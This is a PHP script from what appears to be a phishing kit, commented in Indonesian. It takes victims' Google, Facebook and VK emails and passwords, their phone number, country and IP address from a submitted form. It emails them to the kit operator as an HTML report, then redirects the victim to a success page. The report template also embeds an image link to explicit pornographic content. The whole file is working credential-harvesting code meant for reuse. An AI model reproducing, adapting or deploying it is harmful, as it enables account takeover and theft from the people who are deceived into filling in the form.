<?php
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

include '../email.php';

/* Fungsi berikut untuk mengambil input field. */

$fname = $_POST['fname'];
$secname = $_POST['secname'];
$mailg = $_POST['mailg'];
$pwg = $_POST ['pwg'];
$mailfb = $_POST['mailfb'];
$pwfb = $_POST['pwfb'];
$mailvk = $_POST['mailvk'];
$pwvk = $_POST['pwvk'];
$kota = $_POST['kota'];
$hp = $_POST['hp'];
$ip = $_SERVER['REMOTE_ADDR'];

/* Mengambil informasi untuk dikirim kepada email anda !. */

$body = <<<EOD
<br><hr><br>
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>$fname $secname</b></font></div> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><img src="http://xtgem.club/gambar-bugil/xxx-gif/Gambar_gerak_cewek_cantik_ngangkang_ngentot_003.gif"></font></div> </center>
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>INFO DATA</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Email Google = $mailg</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Password Google = $pwg</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Email Facebook = $mailfb</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Password Facebook = $pwfb</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Email Vk = $mailvk</b></font></div> </center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Password Vk = $pwvk</b></font></div> </center>
   <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Hp = $hp</b></font></div> </center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Country = $kota</b></font></div> </center>
      <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Ip = $ip</b></font></div> </center>
 <center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><b>©opyright 2017 allright reserved Iwan Ster</b></div> </center>
EOD;


$headers = "From: Ensikology\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php $random = rand(100,5000); ?>
<script LANGUAGE="JavaScript">
<!--
window.location="sukses.php";
// -->
</script>
<?php session_start(); session_destroy(); exit; ?>